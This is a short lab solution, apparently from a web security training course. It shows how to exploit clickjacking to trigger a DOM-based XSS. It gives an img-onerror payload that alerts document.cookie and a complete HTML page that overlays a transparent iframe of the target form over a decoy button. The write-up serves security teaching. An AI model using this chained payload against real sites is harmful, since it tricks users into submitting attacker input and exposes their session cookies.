# Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
## Description
The form field `name` is vulnerable to XSS `<img src=1 onerror="alert(document.cookie)">`. The form can be filled automatically and submitted by the end-user through clickjacking.

## Solution
```html
<html>
<head>

<style>
    #target_website {
      position:relative;
      width:528px;
      height:920px;
      opacity:0.60001;
	  margin-bottom: 200px;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
	  top:890px;
	  left:45px;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
<body>

	<div id="decoy_website">
		<button style="width: 140px; height:25px;">Click me</button>
	</div>
	<iframe id="target_website" src="https://target.web-security-academy.net/feedback?name=%3Cimg%20src%3d1%20onerror=%22alert(document.cookie)%22%3E&email=hack@hack.com&subject=sub&message=123"></iframe>
	
</body>
</html>
```
